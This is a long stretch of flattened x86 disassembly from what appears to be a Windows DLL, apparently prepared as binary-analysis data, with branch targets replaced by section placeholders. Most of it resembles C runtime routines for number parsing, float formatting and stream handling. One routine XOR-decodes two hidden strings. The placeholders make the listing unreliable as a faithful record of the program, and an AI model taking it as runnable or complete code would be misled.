mov [ ebp - 0x64 ] ebx
call sub_100519c6
mov edi eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_1002a674
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
mov [ ebp - 0x4a ] al
mov [ ebp - 0x4a ] 0x0
jmp r-xdata
mov eax [ ebp + 0x18 ]
and eax 0xe00
push 0xa
pop edi
cmp eax 0x400
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x50 ] ebx
call sub_100161f2
test al al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x54 ] 0x8
jmp r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_1004cd62
neg eax
sbb eax eax
and eax edi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x54 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_100161f2
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_1004cd62
lea eax [ ebx + 0x1 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_10017b01
mov [ ebp - 0x60 ] edi
cmp [ ebp - 0x54 ] edi
je r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1004cd62
mov [ ebx ] 0x2d
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x54 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x60 ] eax
jmp r-xdata
mov ecx esi
mov [ ebp - 0x58 ] 0x1
call sub_10017b01
push [ ebp - 0x5c ]
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
mov al [ esi + 0x5 ]
mov ecx [ ebp - 0x50 ]
push [ ebp - 0x60 ]
mov [ ecx ] al
movsx eax al
push eax
push r--data
call sub_100783e0
add esp 0xc
test eax eax
je r-xdata
mov ecx esi
call sub_1004cd62
push [ ebp - 0x58 ]
and [ ebp - 0x1c ] 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
call sub_1004b830
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
xor edi edi
add ebx 0x1f
call sub_100161f2
test al al
jne r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x50 ] eax
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x54 ] 0x8
cmp [ esi + 0x5 ] 0x78
je r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x50 ] ebx
jae r-xdata
mov eax [ ebp - 0x50 ]
cmp [ eax ] 0x30
je r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_1001c5c0
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
mov eax [ ebp - 0x54 ]
call sub_10019c00
retn
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4a ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc [ ebp - 0x50 ]
mov [ ebp - 0x49 ] 0x1
mov ecx esi
mov [ ebp - 0x54 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_10017b01
jmp r-xdata
cmp [ ebp - 0x54 ] 0x10
jne r-xdata
cmp [ esi + 0x5 ] 0x58
jne r-xdata
mov ecx esi
call sub_1004cd62
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x4a ]
cmp [ esi + 0x5 ] al
jne r-xdata
mov ecx esi
call sub_1004cd62
mov ecx esi
call sub_10017b01
push [ ebp - 0x5c ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
inc edi
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10050f80
inc edi
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_10042442
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_100159e2
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10042493
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not eax
and ax [ ebp - 0x4 ]
or ax cx
movzx eax ax
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_100424c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080a54
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
call sub_10047080
mov eax [ esi + 0xb4 ]
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0xb4 ] edi
mov [ esi + 0xb8 ] edi
mov [ esi + 0xbc ] edi
cmp [ esi + 0xa8 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx [ esi + 0xb8 ]
lea edx [ esi + 0xc0 ]
push edx
push ecx
push eax
call sub_100624a0
mov edx [ esi + 0xb4 ]
push edx
call sub_10065045
add esp 0x14
xor ecx ecx
mov [ esi + 0xa8 ] 0x7
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] cx
call sub_1000e930
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x94 ]
push eax
call sub_10065045
add esp 0x4
sub_10042590
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ r--data ]
push esi
xor eax eax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0xff9f
and esi 0xff
mov [ ebp + eax * 2 - 0xa8 ] si
inc eax
cmp eax 0x24
jb r-xdata
mov edx [ r--data ]
xor eax eax
mov [ ebp - 0x60 ] ax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0xff86
and esi 0xff
mov [ ebp + eax * 2 - 0x58 ] si
inc eax
cmp eax 0x24
jb r-xdata
xor edx edx
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] dx
push eax
lea edx [ ebp - 0xa8 ]
call sub_10046860
mov ecx [ ebp - 0x4 ]
add esp 0x4
neg eax
sbb eax eax
xor ecx ebp
neg eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10042630
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp edi [ ebp + 0x8 ]
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
mov ebx edi
push esi
lea esi [ eax + 0x1c ]
sub ebx eax
push 0xffffffff
push 0x0
push edi
mov ecx eax
call sub_1001c310
mov eax [ ebx + esi ]
add [ ebp - 0x4 ] 0x24
mov [ esi ] eax
mov ecx [ ebx + esi + 0x4 ]
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] ecx
add edi 0x24
add esi 0x24
cmp edi [ ebp + 0x8 ]
jne r-xdata
pop esi
pop ebx
sub_10042683
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_100270e2
mov esi [ eax ]
call sub_100270e2
cmp esi [ eax ]
jl r-xdata
call sub_1004262a
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_100426ab
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_1003e989
pop ecx
pop ebp
retn
sub_100426f0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
push edx
call sub_10025f6a
mov esi eax
add esp 0xc
cmp esi 0xffffffff
jne r-xdata
pop esi
pop ebp
retn 0x10
call sub_10012991
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov eax esi
sub_10042722
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_10054678
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_10012991
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_10012991
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_1002788e
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_10068fc9
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_1007c900
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_1007ca10
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_1007ca10
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_10078970
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_1007ca10
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_1007c930
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_1007c930
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_1007c930
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_10042aa0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
push ebx
push esi
mov esi eax
xor eax eax
sub ecx eax
push edi
je r-xdata
mov [ esp + 0xc ] eax
dec ecx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi ]
cmp esi [ edx ]
je r-xdata
mov [ esp + 0xc ] 0x1
jmp r-xdata
dec ecx
jne r-xdata
mov eax edx
mov ecx [ eax + 0x30 ]
mov edx [ ecx + 0x4 ]
mov bl 0x6
test [ eax + edx + 0x3c ] bl
jne r-xdata
add edi 0x4
cmp edi ecx
jne r-xdata
mov edi [ edx + 0x3a0 ]
mov ecx [ edx + 0x3a4 ]
cmp edi ecx
je r-xdata
mov [ esp + 0xc ] 0x2
jmp r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
mov ecx [ eax + edx + 0x68 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x2
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push edx
call eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ edi ]
mov eax [ esi + 0x30 ]
mov edx [ eax + 0x4 ]
add esi 0x30
test [ edx + esi + 0xc ] bl
jne r-xdata
mov ecx [ eax + 0x20 ]
mov edx [ ecx + 0x4 ]
test [ edx + eax + 0x2c ] 0x1
je r-xdata
mov edx [ edi ]
add eax ecx
mov [ edx + 0xc8 ] eax
mov eax [ edi ]
cmp [ eax + 0xc8 ] 0xffffffff
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx + 0x4 ]
mov bl 0x6
test [ eax + edx + 0x2c ] bl
jne r-xdata
mov ecx [ edx + esi + 0x38 ]
mov edx [ esp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ebx [ ecx ]
push 0x2
push edx
cdq
push edx
mov edx [ ebx + 0x28 ]
push eax
lea eax [ esp + 0x20 ]
push eax
call edx
mov eax [ esp + 0x18 ]
cdq
add eax [ esp + 0x10 ]
adc edx [ esp + 0x14 ]
cmp eax [ r--data ]
jne r-xdata
lea ecx [ eax + edx + 0x20 ]
mov eax [ ecx + 0x38 ]
neg eax
sbb eax eax
and eax 0xfffffffc
add eax 0x4
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
mov ecx [ eax + edx + 0x58 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x1
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push edx
call eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
jmp r-xdata
cmp edx [ r--data ]
jne r-xdata
push 0x0
call sub_10007bc0
mov eax [ edi ]
mov edx [ eax + 0x20 ]
mov ecx [ edx + 0x4 ]
test [ eax + ecx + 0x2c ] 0x6
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ ecx + esi + 0x38 ]
mov ebx [ ecx ]
push 0x1
push eax
mov eax [ ebp + 0x8 ]
cdq
push edx
push eax
mov eax [ ebx + 0x28 ]
lea edx [ esp + 0x20 ]
push edx
call eax
mov eax [ esp + 0x18 ]
cdq
add eax [ esp + 0x10 ]
adc edx [ esp + 0x14 ]
cmp eax [ r--data ]
jne r-xdata
mov edx [ edi ]
add eax ecx
mov [ edx + 0xcc ] eax
mov esi [ edi ]
mov eax [ esi + 0x20 ]
mov ecx [ eax + 0x4 ]
add esi 0x20
test [ ecx + esi + 0xc ] bl
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
add eax ecx
mov ecx [ eax + ecx + 0x58 ]
mov edx [ ecx ]
mov edx [ edx + 0x28 ]
push 0x1
push 0x1
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
push eax
call edx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
add eax ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edx [ r--data ]
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x0
call sub_10007bc0
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
push 0x0
call sub_10007bc0
sub_10042d40
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x10 ]
mov [ edx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_1005927e
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_10042d7c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
call sub_1002788e
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_10042df0
push ebp
mov ebp esp
push 0xffffffff
push sub_100804e1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x3c ] esi
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov eax 0x1
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] ebx
cmp [ ebp + 0x8 ] ebx
jbe r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] ebx
call sub_1000b569
mov ecx [ edi + 0xf4 ]
sub ecx [ edi + 0xf0 ]
mov eax 0x92492493
imul ecx
mov eax [ ebp - 0x34 ]
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
xor edx edx
div ecx
mov ecx [ edi + 0xf0 ]
add esp 0x4
push 0xffffffff
push ebx
lea eax [ edx * 8 ]
sub eax edx
lea eax [ ecx + eax * 4 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_100146b0
mov ebx [ esi + 0x4 ]
mov eax [ esi ]
lea edx [ ebp - 0x2c ]
push edx
push ebx
call sub_1003ede0
add esp 0x8
cmp eax ebx
jne r-xdata
xor ebx ebx
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_10003820
mov eax [ ebp - 0x30 ]
inc eax
mov [ ebp - 0x30 ] eax
cmp eax [ ebp + 0x8 ]
jb r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
sub_10042f0f
push 0x6c
mov eax sub_1007e745
call sub_10007703
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x64 ] eax
mov eax [ ecx + 0x14 ]
mov edx 0x3000
and eax edx
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_10064bde
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x70 ] eax
call sub_1002a730
mov ecx [ ebp - 0x70 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_1002a674
lea ebx [ edi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] ebx
call sub_1005e05a
movzx eax ax
add esp 0xc
push [ ebp - 0x64 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] 0x0
call sub_10060ea7
test al al
jne r-xdata
push ebx
push ecx
push [ ebp - 0x64 ]
push esi
push [ ebp - 0x68 ]
push edi
call sub_100268fe
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor edi edi
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] edi
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
call sub_10019c00
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2b
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
push [ ebp - 0x64 ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ebx [ ebp - 0x64 ]
push ebx
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2d
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1001e1ec
mov edi [ ebp - 0x60 ]
test edi edi
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x38 ] edi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2d
push ebx
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
